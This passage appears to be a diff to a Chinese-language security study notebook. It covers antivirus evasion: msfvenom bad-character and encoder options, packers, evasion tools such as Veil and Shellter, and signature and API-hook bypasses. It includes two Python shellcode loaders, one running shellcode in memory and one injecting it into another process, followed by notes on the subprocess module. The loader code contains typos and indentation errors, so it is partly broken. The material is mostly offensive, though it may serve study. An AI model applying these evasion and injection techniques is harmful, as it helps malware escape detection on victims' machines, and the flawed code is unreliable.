@@ -3968,8 +3968,53 @@ Wrieshark ： HTTP发送结尾的字符为 4026\r\n ;如 'Hypertext Transfer Pro
 # msfvenom -p windows/x64/exec CMD='calc.exe' -f py #选择windows/x64/exec模块，设置接收值为calc.exe，选择-f选项指定生成脚本为Python脚本的shellcode
 ----------------------------------------------------------------------------
 #shellcode常用机器语言编写，可在寄存器eip溢出后，载入一段可让CPU执行的shellcode机器码，让计算机可以执行任意指令
+----------------------------------------------------------------------------
+-b '\x00\x0a' #-b选项禁止生成的shellcode中出现易被杀毒软件检测的字符
+-e x86/alpha_mixed #选项选择相应的编译器
+壳 ： 全称’可执行程序资源压缩',压缩后的程序可以直接打开
+加壳方式：在二进制程序中植入一段代码，在主程序运行前优先获得程序控制权，之后再将控制权交给主程序代码；
+这样能够有效地隐藏程序的入口点(OEP).需要的就是加壳后隐藏OEP的功能，以达到免杀效果
 
-1.内存加载shellcode
+工具：
+Veil工具：可以生成基于C，Go, Ruby, Python, C#, Perl, Powershell等格式的payload
+Venom工具： 利用msfvenom生成不同格式的shellcode,C,Python,Ruby,DLL,MSI,hta-psh等，将生成的shellcode注入程序中，并使用类似gcc,mingw32huo pyinstall等编译器生成windows系统下的Payload文件
+Shellter工具：windows,Linux
+BackDoor-factory工具，又称后门工厂BDF
+----------------------------------------------------------------------------
+免杀处理类型：
+[1]通过二进制实现免杀，或通过修改asm代码、二进制数据、其他数据完成免杀
+[2]源码免杀，通过修改源代码免杀，结合二进制进行免杀
+也可以分为静态文件免杀、动态行为免杀
+
+[1]静态免杀：通过修改特征码
+
+要查找文件的特征码，使用特征码定位工具，CCL，MYCCL， VirTest
+找到特征码，修改特征码的值，
+
+[2]动态监测原理： 通过拦截恶意行为，
+如注册表操作、文件写入、杀进程、劫持 等方式发现木马
+恶意行为 都是通过API的调用完成的，杀毒软件通过拦截这些API的调用实现拦截
+动态免杀：
+1/替换API
+2/未导出API
+3/重写API，即通过逆向操作重写API功能
+4/跳字节：一部分杀毒软件的PAI拦截操作是通过对API的前几个字节内容的监测实现的，跳过头部字节，就可以避开这种拦截方式
+5/底层API
+----------------------------------------------------------------------------
+防御策略
+
+特征代码法
+校验法
+行为检测法
+模拟法
+----------------------------------------------------------------------------
+```
+</details>
+
+<details>
+<summary>[1]内存加载shellcode</summary>
+  
+```
 # msfvenom -p windows/x64/exec CMD='calc.exe' -f py
 
 #导入模块，并给程序分配内存后可进行读写操作
@@ -3978,11 +4023,147 @@ form crypes.wintypes import *
 import sys
 
 PAGE_EXECUTE_READWRITE = 0x000000040 #区域可执行代码，可读可写
-MWM_COMMIT = 0x3000 # 分配内存
+MEM_COMMIT = 0x3000 # 分配内存
 PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF ) #给予进程所有权限
 
 #调用windows api,调用一些底层函数，或者少见的API函数，就可以绕过杀毒软件的API检测
 #windows api
+VirtualAlloc = windll.kernel32.VirtualAlloc
+RtlMoveMemoty = windll.kernel32.RtlMoveMemoty
+CreateThread = windll.kernel32.CreateThread
+WaitForSingleObject = windll.kernel32.WaitForSingleObject
+OpenProcess = windll.kernel32.OpenProcess
+VirtualAllocEx = windll.kernel32.VirtualAllocEx
+WriteProcessMemory = windll.kernel32.WriteProcessMemory
+CreateRemoteThread = windll.kernel32.CreateRemoteThread
+
+#将前面生成的shellcode赋值给shellcode参数，赋值前使用bytearray函数处理：
+shellcode = bytearray(
+    b"\xfc\x48..."
+    b"..........."
+    ...
+)
+
+#创建一个方法并调用，申请内存，将shellcode指向分配的内存指针，再复制shellcode到内存中，创建线程事件并执行
+def run1():
+    VirtualAlloc.restype = ctypes.c_void_p #重载函数返回类型为void
+    p = VirtualAlloc(c_int(0), c_int(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE) #申请内存
+    buf = (c_char * len(shellcode)).from_buffer(shellcode)     #将shellcode指向指针
+    RtlMoveMemory(c_void_p(p), buf, c_int(len(shellcode)))     #复制shellcode到申请的内存中
+    h = CreateThread(c_int(0), c_int(0), c_void_p(p), c_int(0), c_int(0), pointer(c_int(0)))   #执行创建线程
+WaitForSingleObject(c_int(h), c_int(-1))     #检测线程创建事件
+if __name__ == "__main__":
+run1()
+
+#>cd Decktop
+#>Decktop> python 1.py
+#>Decktop> pyinstall -F 1.py   #使用python的pyinstall生成1.py
+```
+
+</details>
+
+<details>
+<summary>[2]进程注入shellcode</summary>
+
+```
+# 使用-p选定exec的模块，接收参数值为calc.exe
+# 设置EXITFUNC参数为thread,拉起子线程中运行shellcode
+
+msfvenom -p windows/x64/exec CMD='calc.exe' EXITFUNC=thread -f py
+
+from ctypes import *
+from ctypes.wintypes import *
+import sys
+
+PAGE_EXECUTE_READWRITE = 0x000000040 #区域可执行代码，可读可写
+MEM_COMMIT = 0x3000 # 分配内存
+PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF ) #给予进程所有权限
+
+VirtualAlloc = windll.kernel32.VirtualAlloc
+RtlMoveMemoty = windll.kernel32.RtlMoveMemoty
+CreateThread = windll.kernel32.CreateThread
+WaitForSingleObject = windll.kernel32.WaitForSingleObject
+OpenProcess = windll.kernel32.OpenProcess
+VirtualAllocEx = windll.kernel32.VirtualAllocEx
+WriteProcessMemory = windll.kernel32.WriteProcessMemory
+CreateRemoteThread = windll.kernel32.CreateRemoteThread
+
+# 赋值shellcode,这里使用另一种赋值方式
+shellcode1 = b""
+shellcode1 += b"\xfc\x48...."
+shellcode1 += b"............"
+...
+
+def run2(pid):
+    h_process = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+    if h_process:
+        p = VirtualAllocEx(h_process, c_int(0), c_int(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCVOID, c_size_t, POINTER(c_size_t)]
+        WtietProcessMemory.restype = BOOL
+        buf = create_string_buffer(shellcode1)
+        WriteProcessMemory(h_process, p, shellcode1, sizeof(buff), byref(c_size_t(0)))
+    else:
+        print("无法打开进程pid: %s" % pid)
+        sys.exit()
+
+CreateRemoteThread(h_process, None, c_int(0), p, None, 0, byref(c_ulong(0)))
+
+if __name__ == "__main__":
+    run2(int(sys.argv[1]))
+```
+
+</details>
+
+----------------------------------------------------------------------------
+#### 远程控制工具
+
+<details>
+<summary>subprocess模块</summary>
+
+```
+subprocess模块主要作用：执行外部的命令和程序
+
+子进程
+管理标准流(standard stream) ,管道(pipe)
+----------------------------------------------------------------------------
+subprocess.call(args, *, stdin = None, stdout = None, stderr = None, shell = False, cwd = None, timeout = None)
+若args为数组，则需要将命令和参数分开，否则会出现No such file or directory错误
+
+# 当args接收的参数为数组，且格式正确时，会输出命令执行结果并返回0
+>>> subprocess.call(['ls', '-la'])
+
+# 若args接收的参数为字符串时，需要让shell为True;这样subprocess.call()函数会把接收到的字符串当作命令并调用shell去执行，成功执行后返回执行结果并返回0
+>>> subprocess.call('ls -la', shell=True)
+----------------------------------------------------------------------------
+subprocess.check_call(args, *, stdin = None, stdout = None, stderr = None, shell = False, cwd = None, timeout = None)
+
+如果返回值非0，则会抛出CallProcessError异常
+
+subproccess.CalledProcessError异常包括returncode(子进程的退出码),cmd(子进程的执行命令),output(为None)等属性
+>>> subprocess.check_call("ping -c 4 www.baidu.com", shell=True)  #执行成功结果最后会返回0
+
+通过try...except...语句捕获CallProcessRrror异常
+>>>try:
+...    res = subprocess.check_call(['ls', '{'])
+...    print('res:', res)
+...exceot subprocess.CalledProcessError as exc:
+...    print('returncode:', exc.returncode)
+...    print('cmd:', exc.cmd)
+...    print('output:', exc.output)
+ls: 无法访问'{': 没有那个文件或目录
+returncode: 2
+cmd: ['ls', '{']
+output: None
+>>>
+----------------------------------------------------------------------------
+subprocess.check_output(args, *, stdin = None, stderr = None, shell = False, cwd = None, encoding = None, errors = None, Universal_newlines = None, timeout = None, text = None)
+
+与前两个函数的区别：它会以字符串式返回执行结果的输出
+
+返回值 returncode不为0，则会抛出subprocess.CalledProcessError异常
+>>> result = subprocess.check_output("ping -c 3 www.baidu.com", shell=True)
+>>> print(result)
+----------------------------------------------------------------------------
 ```
 
 </details>
